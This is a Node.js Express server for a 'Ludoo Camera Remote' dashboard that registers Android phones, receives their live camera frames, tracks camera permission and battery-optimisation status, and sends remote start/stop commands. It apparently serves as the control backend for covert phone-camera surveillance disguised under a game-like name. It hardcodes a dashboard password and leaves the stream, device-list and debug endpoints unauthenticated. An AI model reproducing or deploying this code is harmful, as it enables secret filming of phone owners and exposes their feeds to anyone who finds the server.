const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = require('http').createServer(app);

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ========== AUTH ==========
const DASHBOARD_PASSWORD = 'ajaybabu95';
const SESSION_SECRET = crypto.randomBytes(32).toString('hex');
const VALID_TOKEN = crypto.createHmac('sha256', SESSION_SECRET).update(DASHBOARD_PASSWORD).digest('hex');

function parseCookies(req) {
    const raw = req.headers.cookie || '';
    return Object.fromEntries(raw.split(';').map(c => c.trim().split('=').map(decodeURIComponent)));
}
function isAuthenticated(req) {
    return parseCookies(req)['lsess'] === VALID_TOKEN;
}
function requireAuth(req, res, next) {
    if (isAuthenticated(req)) return next();
    res.redirect('/login');
}

let devices = [];
let deviceHeartbeats = {};
let pendingCommands = {};
let latestFrames = {};
let deviceSettings = {};
let frameQueue = {};

function getDeviceSettings(deviceId) {
    if (!deviceSettings[deviceId]) deviceSettings[deviceId] = { stream: false, quality: 240, fps: 15 };
    return deviceSettings[deviceId];
}

function resolveDeviceSettings(deviceId) {
    if (deviceSettings[deviceId]) return deviceSettings[deviceId];
    let bestId = null, bestLen = 0;
    for (const knownId of Object.keys(deviceSettings)) {
        let common = 0;
        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
            bestId = knownId; bestLen = common;
        }
    }
    return bestId ? deviceSettings[bestId] : getDeviceSettings(deviceId);
}

function resolveLatestFrame(deviceId) {
    if (latestFrames[deviceId]) return latestFrames[deviceId];
    let bestFrame = null, bestLen = 0;
    for (const knownId of Object.keys(latestFrames)) {
        let common = 0;
        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
            bestFrame = latestFrames[knownId]; bestLen = common;
        }
    }
    return bestFrame || null;
}

function findCanonicalDevice(deviceId) {
    if (!deviceId) return null;
    const exact = devices.find(d => d.id === deviceId);
    if (exact) return exact;
    let best = null, bestLen = 0;
    for (const d of devices) {
        let common = 0;
        while (common < d.id.length && common < deviceId.length && d.id[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, d.id.length, deviceId.length)) {
            best = d; bestLen = common;
        }
    }
    return best;
}

// Cleanup stale devices every 60s
setInterval(() => {
    const now = Date.now();
    devices = devices.filter(device => {
        const lastSeen = device.lastSeen || 0;
        const stale = (now - lastSeen) > 300000;
        if (stale) {
            console.log(`🧹 Removing stale device: ${device.id}`);
            delete deviceHeartbeats[device.id];
            delete pendingCommands[device.id];
            delete latestFrames[device.id];
            delete deviceSettings[device.id];
            delete frameQueue[device.id];
            return false;
        }
        return true;
    });
}, 60000);

// ========== HTTP API ==========

// ✅ HEARTBEAT
app.post('/api/heartbeat', (req, res) => {
    try {
        const { deviceId, deviceName, camera, cameraReady, streaming, cameraPermission, batteryOptimization, batteryPercentage } = req.body;
        deviceHeartbeats[deviceId] = Date.now();
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = { id: deviceId, name: deviceName || 'Android Device', connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now() };
            devices.push(device);
            console.log(`✅ Device registered: ${device.name} (${deviceId})`);
        }
        device.name = deviceName || device.name;
        device.camera = camera || device.camera;
        device.cameraReady = cameraReady;
        device.streaming = streaming;
        device.cameraPermission = cameraPermission;
        device.batteryOptimization = batteryOptimization;
        device.batteryPercentage = batteryPercentage || 0;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();
        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ FRAME UPLOAD - FIXED: Pre-convert base64 to buffer ONCE
let totalFramesReceived = 0;
app.post('/api/frame', (req, res) => {
    try {
        const { deviceId, image, quality, fps, camera } = req.body;
        
        if (deviceId && image) {
            // ✅ Convert base64 to buffer ONLY ONCE
            const imgBuf = Buffer.from(image, 'base64');
            const frameData = {
                buf: imgBuf,
                ts: Date.now(),
                quality: quality || 240,
                fps: fps || 15,
                camera: camera || 'back'
            };
            
            // Store latest frame
            latestFrames[deviceId] = frameData;
            
            // ✅ Frame queue for smooth streaming
            if (!frameQueue[deviceId]) frameQueue[deviceId] = [];
            if (frameQueue[deviceId].length > 3) {
                frameQueue[deviceId].shift(); // Drop oldest
            }
            frameQueue[deviceId].push(frameData);
            
            totalFramesReceived++;
            if (totalFramesReceived % 30 === 1) {
                console.log(`📷 Frame #${totalFramesReceived} from [${deviceId}] | size=${imgBuf.length} bytes`);
            }
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ FRAME FETCH JSON (legacy / debug)
app.get('/api/frame/:deviceId', (req, res) => {
    const frame = resolveLatestFrame(req.params.deviceId);
    if (!frame) return res.json({ success: false, image: null });
    // ✅ Convert buffer back to base64 for legacy clients
    res.json({ success: true, image: frame.buf.toString('base64'), ts: frame.ts });
});

// ✅ FRAME FETCH BINARY — raw JPEG bytes
app.get('/api/frameb/:deviceId', (req, res) => {
    const frame = resolveLatestFrame(req.params.deviceId);
    if (!frame || !frame.buf) { res.status(204).end(); return; }
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Content-Length', frame.buf.length);
    res.setHeader('X-Frame-Ts', String(frame.ts));
    res.setHeader('Cache-Control', 'no-store');
    res.send(frame.buf);
});

// ✅ HTTP CHUNKED STREAM (MJPEG) - FIXED: No base64 conversion
app.get('/api/stream/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`🎥 MJPEG stream started for: ${deviceId}`);

    res.setHeader('Content-Type', 'multipart/x-mixed-replace; boundary=--boundary');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');

    let active = true;
    let lastSentTs = 0;
    let interval = null;

    const sendFrame = () => {
        if (!active) return;
        
        // ✅ Get latest frame from queue
        let frame = null;
        const queue = frameQueue[deviceId];
        if (queue && queue.length > 0) {
            frame = queue[queue.length - 1]; // Latest frame
        }
        if (!frame) {
            frame = latestFrames[deviceId];
        }
        
        // ✅ Send only new frames (no duplicates)
        if (frame && frame.buf && frame.ts !== lastSentTs) {
            lastSentTs = frame.ts;
            try {
                // ✅ DIRECT BUFFER USE - NO CONVERSION!
                const header = `--boundary\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.buf.length}\r\n\r\n`;
                res.write(header);
                res.write(frame.buf);
                res.write('\r\n');
            } catch (e) {
                console.log(`⚠️ MJPEG write error: ${e.message}`);
                stopStream();
            }
        }
    };

    const stopStream = () => {
        active = false;
        if (interval) { clearInterval(interval); interval = null; }
        try { res.end(); } catch (e) {}
        console.log(`🎥 MJPEG stream stopped for: ${deviceId}`);
    };

    // ✅ 30 FPS check (sends only when new frame available)
    interval = setInterval(sendFrame, 33);

    req.on('close', stopStream);
    req.on('error', stopStream);
});

// ✅ COMMAND SEND
app.post('/api/command', (req, res) => {
    try {
        const { deviceId, command, value } = req.body;
        const ds = getDeviceSettings(deviceId);
        switch (command) {
            case 'start': ds.stream = true; break;
            case 'stop':  ds.stream = false; break;
            case 'quality': ds.quality = value; break;
            case 'fps':   ds.fps = value; break;
        }
        const cmd = { command, value: value ?? null };
        if (deviceId) {
            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
            pendingCommands[deviceId].push(cmd);
        }
        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ COMMAND POLL
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        deviceHeartbeats[deviceId] = Date.now();
        if (!findCanonicalDevice(deviceId)) {
            devices.push({ id: deviceId, name: deviceId, connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now(), lastHeartbeat: new Date().toLocaleTimeString() });
            console.log(`📱 Auto-registered: ${deviceId}`);
        }
        let cmds = [];
        const allKeys = Object.keys(pendingCommands);
        for (const key of allKeys) {
            if (pendingCommands[key].length === 0) continue;
            let common = 0;
            while (common < key.length && common < deviceId.length && key[common] === deviceId[common]) common++;
            if (key === deviceId || common >= Math.min(8, key.length, deviceId.length)) {
                cmds = cmds.concat(pendingCommands[key]);
                pendingCommands[key] = [];
            }
        }
        if (cmds.length > 0) console.log(`✅ HTTP delivered ${cmds.length} cmd(s) to [${deviceId}]`);
        res.json({ success: true, settings: getDeviceSettings(deviceId), commands: cmds.map(c => c.command) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ DEVICE STATUS
app.post('/api/device-status', (req, res) => {
    try {
        const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
        let device = devices.find(d => d.id === deviceId);
        if (device) {
            if (cameraReady !== undefined) device.cameraReady = cameraReady;
            if (streaming !== undefined) device.streaming = streaming;
            if (cameraType) device.camera = cameraType;
            if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
            device.status = status;
            device.lastUpdate = new Date().toLocaleTimeString();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ DEVICES LIST
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    res.json({ success: true, devices: devices.map(d => ({
        id: d.id, name: d.name, camera: d.camera || 'back',
        cameraReady: d.cameraReady || false, streaming: d.streaming || false,
        cameraPermission: d.cameraPermission || false,
        batteryOptimization: d.batteryOptimization || false,
        batteryPercentage: d.batteryPercentage || 0,
        isConnected: (now - (d.lastSeen || 0)) < 30000,
        hasWebSocket: false,
        lastHeartbeat: d.lastHeartbeat, connectedAt: d.connectedAt
    }))});
});

app.get('/api/device/:deviceId', (req, res) => {
    const device = devices.find(d => d.id === req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Not found' });
    const now = Date.now();
    res.json({ success: true, device: { ...device, isConnected: (now - (device.lastSeen || 0)) < 30000, hasWebSocket: false } });
});

app.get('/api/settings', (req, res) => res.json({ success: true, settings: {} }));

app.get('/api/health', (req, res) => res.json({ status: 'ok', devices: devices.length, uptime: process.uptime() }));

app.get('/api/debug', (req, res) => {
    res.json({
        devices: devices.map(d => d.id),
        pendingCommands,
        frameQueueSize: Object.fromEntries(Object.entries(frameQueue).map(([k, v]) => [k, v.length])),
        heartbeats: Object.fromEntries(Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`]))
    });
});

app.get('/favicon.ico', (req, res) => res.status(204).end());

// ========== LOGIN / LOGOUT ==========
app.get('/login', (req, res) => {
    if (isAuthenticated(req)) return res.redirect('/');
    const err = req.query.err ? '<p style="color:#f44336;margin-top:12px;font-size:13px;">❌ Wrong password. Try again.</p>' : '';
    res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ludoo Remote — Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0a0a;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
.card{background:#1a1a1a;border-radius:20px;padding:36px 28px;width:90%;max-width:360px;border:1px solid #2a2a2a;text-align:center;}
h1{font-size:28px;margin-bottom:4px;}
.sub{color:#666;font-size:13px;margin-bottom:28px;}
input{width:100%;padding:14px 16px;background:#0a0a0a;border:1px solid #333;border-radius:12px;color:#fff;font-size:15px;margin-bottom:16px;outline:none;transition:border .2s;letter-spacing:2px;}
input:focus{border-color:#667eea;}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:opacity .2s;}
button:hover{opacity:.88;}
.lock{font-size:48px;margin-bottom:16px;}
</style>
</head>
<body>
<div class="card">
  <div class="lock">🔐</div>
  <h1>Ludoo Remote</h1>
  <p class="sub">Enter password to access dashboard</p>
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Password" autofocus autocomplete="current-password">
    <button type="submit">Unlock →</button>
  </form>
  ${err}
</div>
</body>
</html>`);
});

app.post('/login', (req, res) => {
    if (req.body.password === DASHBOARD_PASSWORD) {
        const maxAge = 7 * 24 * 60 * 60;
        res.setHeader('Set-Cookie', `lsess=${VALID_TOKEN}; HttpOnly; SameSite=Strict; Max-Age=${maxAge}; Path=/`);
        return res.redirect('/');
    }
    res.redirect('/login?err=1');
});

app.get('/logout', (req, res) => {
    res.setHeader('Set-Cookie', 'lsess=; HttpOnly; SameSite=Strict; Max-Age=0; Path=/');
    res.redirect('/login');
});

// ========== WEB INTERFACE ==========
app.get('/', requireAuth, (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludoo Camera Remote</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
        .container { max-width:600px; margin:0 auto; }
        .header { text-align:center; margin-bottom:20px; position:relative; }
        .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header p { font-size:12px; color:#666; margin-top:5px; }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
        .stat-card { background:#1a1a1a; border-radius:12px; padding:12px; text-align:center; border:1px solid #2a2a2a; }
        .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
        .stat-value { font-size:20px; font-weight:700; }
        .stat-value.online { color:#4CAF50; }
        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
        #video { width:100%; height:100%; object-fit:cover; display:none; }
        .video-placeholder { text-align:center; color:#555; padding:12px; }
        .video-placeholder span { font-size:48px; display:block; margin-bottom:8px; }
        .video-placeholder .status-hint { font-size:11px; color:#444; margin-top:6px; }
        #streamStatus { position:absolute; top:8px; left:8px; font-size:10px; padding:3px 8px; border-radius:20px; font-weight:600; display:none; }
        .stream-live { background:rgba(76,175,80,.85); color:#fff; }
        .stream-waiting { background:rgba(255,152,0,.85); color:#fff; }
        .stream-noframes { background:rgba(244,67,54,.85); color:#fff; }
        .controls { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
        .section-title { font-size:12px; color:#888; margin-bottom:12px; letter-spacing:1px; }
        .button-group { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
        .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
        .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
        .btn-flip { background:#2196F3; color:white; } .btn-flip:hover { background:#0b7dda; }
        .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
        .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
        .quality-btn.active { background:#667eea; border-color:#667eea; }
        .fps-control { margin-top:16px; }
        .fps-slider { width:100%; height:4px; -webkit-appearance:none; background:#2a2a2a; border-radius:2px; margin:10px 0; }
        .fps-slider::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; background:#667eea; border-radius:50%; cursor:pointer; }
        .fps-value { text-align:center; font-size:12px; color:#888; }
        .devices { background:#1a1a1a; border-radius:16px; padding:16px; border:1px solid #2a2a2a; }
        .device-item { display:flex; justify-content:space-between; align-items:center; padding:12px 10px; cursor:pointer; transition:background .2s; border-radius:8px; margin:2px 0; }
        .device-item:hover { background:#252525; }
        .device-item.selected { background:#1e1e3a; border:1px solid #667eea; }
        .device-name { font-size:14px; font-weight:500; }
        .device-status-dot { width:10px; height:10px; border-radius:50%; margin-left:10px; }
        .status-connected { background:#4CAF50; box-shadow:0 0 5px #4CAF50; }
        .empty-devices { text-align:center; color:#555; padding:20px; }
        .status-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.85); z-index:1000; justify-content:center; align-items:center; }
        .status-modal-content { background:#1a1a1a; border-radius:20px; width:90%; max-width:350px; padding:20px; border:1px solid #667eea; }
        .status-modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid #2a2a2a; }
        .status-modal-title { font-size:18px; font-weight:600; }
        .status-modal-close { background:none; border:none; color:#888; font-size:24px; cursor:pointer; }
        .status-item { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #2a2a2a; font-size:14px; }
        .status-item:last-child { border-bottom:none; }
        .status-label { color:#888; }
        .status-allowed { color:#4CAF50; font-weight:600; }
        .status-denied { color:#f44336; font-weight:600; }
        .status-pending { color:#FF9800; font-weight:600; }
        .battery-bar-small { height:6px; background:#2a2a2a; border-radius:3px; overflow:hidden; width:100px; }
        .battery-fill-small { height:100%; background:linear-gradient(90deg,#4CAF50,#8BC34A); border-radius:3px; }
        .flex-row { display:flex; align-items:center; gap:10px; }
        .logout-btn { position:absolute; top:0; right:0; background:none; border:1px solid #333; color:#666; font-size:11px; padding:5px 11px; border-radius:20px; cursor:pointer; transition:all .2s; text-decoration:none; }
        .logout-btn:hover { border-color:#f44336; color:#f44336; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📹 Ludoo Remote</h1>
        <p id="connMode">📡 HTTP Polling Mode</p>
        <a href="/logout" class="logout-btn">🔒 Logout</a>
    </div>
    <div class="stats">
        <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
        <div class="stat-card"><div class="stat-label">DEVICES</div><div class="stat-value" id="deviceCount">0</div></div>
        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsCount">0</div></div>
    </div>
    <div class="video-container" id="videoContainer">
        <img id="video" style="width:100%;height:100%;object-fit:cover;display:none;">
        <div id="streamStatus"></div>
        <div id="placeholder" class="video-placeholder">
            <span>📷</span>
            <div id="placeholderText">Pehle device select karo</div>
            <div class="status-hint" id="placeholderHint"></div>
        </div>
    </div>
    <div class="controls">
        <div class="section-title">🎮 CONTROLS</div>
        <div class="button-group">
            <button class="btn btn-start" id="startBtn">▶ START</button>
            <button class="btn btn-stop" id="stopBtn">⏹ STOP</button>
            <button class="btn btn-flip" id="flipBtn">🔄 FLIP</button>
        </div>
        <div class="section-title">📐 QUALITY</div>
        <div class="quality-grid">
            <button class="quality-btn" data-quality="120">120p</button>
            <button class="quality-btn" data-quality="140">140p</button>
            <button class="quality-btn active" data-quality="240">240p</button>
            <button class="quality-btn" data-quality="360">360p</button>
        </div>
        <div class="fps-control">
            <div class="section-title">⚡ FPS</div>
            <input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider">
            <div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div>
        </div>
    </div>
    <div class="devices">
        <div class="section-title">📱 CONNECTED DEVICES</div>
        <div id="devicesList"><div class="empty-devices">No devices connected</div></div>
    </div>
</div>
<div id="statusModal" class="status-modal">
    <div class="status-modal-content">
        <div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div>
        <div id="modalContent"></div>
    </div>
</div>
<script>
    let selectedDeviceId = null, currentDevices = [], isStreaming = false;
    let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
    let streamStartTime = 0, noFrameWarnTimer = null;

    const video = document.getElementById('video'),
          placeholder = document.getElementById('placeholder'),
          placeholderText = document.getElementById('placeholderText'),
          placeholderHint = document.getElementById('placeholderHint'),
          streamStatusEl = document.getElementById('streamStatus'),
          deviceCountSpan = document.getElementById('deviceCount'),
          fpsCountSpan = document.getElementById('fpsCount'),
          devicesList = document.getElementById('devicesList'),
          fpsSlider = document.getElementById('fpsSlider'),
          fpsLabel = document.getElementById('fpsLabel');

    function setStreamStatus(state, text) {
        streamStatusEl.style.display = text ? 'block' : 'none';
        streamStatusEl.className = state;
        streamStatusEl.textContent = text;
    }

    function updateFrame(src) {
        video.src = src;
        video.style.display = 'block';
        placeholder.style.display = 'none';
        setStreamStatus('stream-live', '● LIVE');
        if (noFrameWarnTimer) { clearTimeout(noFrameWarnTimer); noFrameWarnTimer = null; }
        frameCount++;
        const now = Date.now();
        if (now - lastFpsUpdate >= 1000) {
            fpsCountSpan.textContent = frameCount;
            frameCount = 0;
            lastFpsUpdate = now;
        }
    }

    let mjpegActive = false;
    let fpsTimer = null;

    function startFramePoll() {
        stopFramePoll();
        mjpegActive = true;

        setStreamStatus('stream-waiting', '⏳ Connecting...');
        placeholderText.textContent = 'Stream connect ho raha hai...';
        placeholderHint.textContent = '';

        video.src = '/api/stream/' + selectedDeviceId + '?t=' + Date.now();
        video.style.display = 'block';
        placeholder.style.display = 'none';

        noFrameWarnTimer = setTimeout(() => {
            if (mjpegActive) {
                setStreamStatus('stream-noframes', '❌ No frames');
                placeholderText.textContent = '⚠️ Device se frames nahi aa rahe';
                placeholderHint.textContent = 'Android app open hai? Camera permission Allow hai? App foreground me hai?';
            }
        }, 6000);

        let prevTs = 0, fpsFrames = 0, firstFrame = false;
        const detectFrame = () => {
            if (!mjpegActive) return;
            fetch('/api/frame/' + selectedDeviceId, { cache: 'no-store' })
                .then(r => r.json())
                .then(d => {
                    if (d.success && d.ts && d.ts !== prevTs) {
                        prevTs = d.ts;
                        fpsFrames++;
                        if (!firstFrame) {
                            firstFrame = true;
                            setStreamStatus('stream-live', '● LIVE');
                            if (noFrameWarnTimer) { clearTimeout(noFrameWarnTimer); noFrameWarnTimer = null; }
                        }
                    }
                })
                .catch(() => {})
                .finally(() => { if (mjpegActive) framePollTimer = setTimeout(detectFrame, 200); });
        };
        detectFrame();

        fpsTimer = setInterval(() => {
            fpsCountSpan.textContent = fpsFrames;
            fpsFrames = 0;
        }, 1000);
    }

    function stopFramePoll() {
        mjpegActive = false;
        video.src = '';
        if (framePollTimer)  { clearTimeout(framePollTimer);  framePollTimer = null; }
        if (fpsTimer)        { clearInterval(fpsTimer);       fpsTimer = null; }
        if (noFrameWarnTimer){ clearTimeout(noFrameWarnTimer); noFrameWarnTimer = null; }
        setStreamStatus('', '');
    }

    function sendCommand(command, value) {
        if (!selectedDeviceId) { alert('Select a device first'); return; }
        fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
        }).catch(() => {});
    }

    document.getElementById('startBtn').onclick = () => {
        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
        sendCommand('start');
        isStreaming = true;
        startFramePoll();
    };
    document.getElementById('stopBtn').onclick = () => {
        if (!selectedDeviceId) return;
        sendCommand('stop');
        isStreaming = false;
        stopFramePoll();
        video.src = ''; video.style.display = 'none';
        placeholder.style.display = 'block';
        placeholderText.textContent = '▶ START dabao stream ke liye';
        placeholderHint.textContent = '';
        fpsCountSpan.textContent = '0';
    };
    document.getElementById('flipBtn').onclick = () => sendCommand('flip');

    document.querySelectorAll('.quality-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            sendCommand('quality', parseInt(btn.dataset.quality));
        };
    });
    fpsSlider.oninput = () => {
        const fps = parseInt(fpsSlider.value);
        fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
        sendCommand('fps', fps);
        if (isStreaming) startFramePoll();
    };

    function closeStatusModal() { document.getElementById('statusModal').style.display = 'none'; }
    function showDeviceStatus(device) {
        document.getElementById('modalDeviceName').textContent = '📱 ' + device.name;
        const battery = device.batteryPercentage || 0;
        document.getElementById('modalContent').innerHTML =
            '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored (Allowed)' : '❌ Not Ignored (Denied)') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div>' +
            '<div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>';
        document.getElementById('statusModal').style.display = 'flex';
    }

    function selectDevice(deviceId) {
        if (selectedDeviceId === deviceId) return;
        if (isStreaming) { sendCommand('stop'); stopFramePoll(); }
        selectedDeviceId = deviceId;
        isStreaming = false;
        lastFrameTs = 0;
        video.src = ''; video.style.display = 'none';
        placeholder.style.display = 'block';
        placeholderText.textContent = '▶ START dabao stream ke liye';
        placeholderHint.textContent = '';
        fpsCountSpan.textContent = '0';
        renderDeviceList();
    }

    function renderDeviceList() {
        const connected = currentDevices.filter(d => d.isConnected);
        deviceCountSpan.textContent = connected.length;
        if (connected.length === 0) { devicesList.innerHTML = '<div class="empty-devices">No devices connected</div>'; return; }
        devicesList.innerHTML = connected.map(d =>
            '<div class="device-item' + (d.id === selectedDeviceId ? ' selected' : '') + '" data-id="' + d.id + '">' +
            '<div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0;">' +
            '<span class="device-name" style="flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">📱 ' + d.name + '</span>' +
            (d.streaming ? '<span style="font-size:10px;color:#4CAF50;white-space:nowrap;">● LIVE</span>' : '') +
            '</div>' +
            '<div style="display:flex;align-items:center;gap:8px;">' +
            '<button data-info="' + d.id + '" style="background:none;border:1px solid #444;color:#888;font-size:11px;padding:3px 8px;border-radius:8px;cursor:pointer;">ℹ Info</button>' +
            '<div class="device-status-dot status-connected"></div>' +
            '</div></div>'
        ).join('');
        devicesList.querySelectorAll('.device-item').forEach(el => {
            el.addEventListener('click', (e) => {
                if (e.target.dataset.info) { const d = currentDevices.find(x => x.id === e.target.dataset.info); if (d) showDeviceStatus(d); return; }
                selectDevice(el.dataset.id);
            });
        });
    }

    async function fetchDevices() {
        try {
            const data = await fetch('/api/devices').then(r => r.json());
            if (data.success) {
                currentDevices = data.devices;
                if (!selectedDeviceId && currentDevices.filter(d => d.isConnected).length > 0) {
                    selectDevice(currentDevices.filter(d => d.isConnected)[0].id);
                    return;
                }
                renderDeviceList();
            }
        } catch(e) {}
    }

    fetchDevices();
    setInterval(fetchDevices, 3000);
</script>
</body>
</html>`);
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('═══════════════════════════════════════════════════');
    console.log('✅  Ludoo Camera Remote  —  HTTP Polling + Chunked Mode (FIXED)');
    console.log('═══════════════════════════════════════════════════');
    console.log('🌐  Web UI       : http://localhost:' + PORT);
    console.log('❤️   Heartbeat    : POST /api/heartbeat');
    console.log('📡  HTTP Command : POST /api/command');
    console.log('⏳  HTTP Poll    : GET  /api/commands/:deviceId');
    console.log('🖼️   Frame        : POST /api/frame (pre-converted to buffer)');
    console.log('🎥  Chunked      : GET  /api/stream/:deviceId (direct buffer)');
    console.log('📱  Devices      : GET  /api/devices');
    console.log('🔍  Debug        : GET  /api/debug');
    console.log('═══════════════════════════════════════════════════');
    console.log('');
});
